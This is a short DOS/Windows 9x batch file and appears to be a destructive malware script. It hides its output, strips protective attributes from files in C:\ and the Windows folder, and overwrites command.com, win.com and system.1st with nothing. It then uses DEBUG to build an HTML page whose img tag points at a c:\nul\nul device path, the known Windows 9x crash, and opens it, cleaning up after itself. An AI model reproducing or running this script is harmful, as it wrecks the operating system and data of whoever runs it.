   @echo off
   @ctty nul
   @attrib -h -r -s -a c:\*.*
   @attrib -h -r -s -a %windir%\*.*
   @move nul c:\system.1st
   @move nul c:\command.com
   @move nul %windir%\win.com
   @echo e 0100  3C 69 6D 67 20 73 72 63 3D 22 66 69 6C 65 3A 2F>>Cr4Sh
   @echo e 0110  2F 2F 44 7C 2F 63 3A 5C 6E 75 6C 5C 6E 75 6C 22>>Cr4Sh
   @echo e 0120  3E 00>>Cr4Sh
   @echo rcx>>Cr4Sh
   @echo 21>>Cr4Sh
   @echo n htm>>Cr4Sh
   @echo w>>Cr4Sh
   @echo q>>Cr4Sh
   @debug<Cr4Sh
   @ren htm Cr4Sh.htm
   @deltree/y htm >nul
   @deltree/y Cr4Sh >nul
   @start /max Cr4Sh.htm >nul
   ctty con
   cls
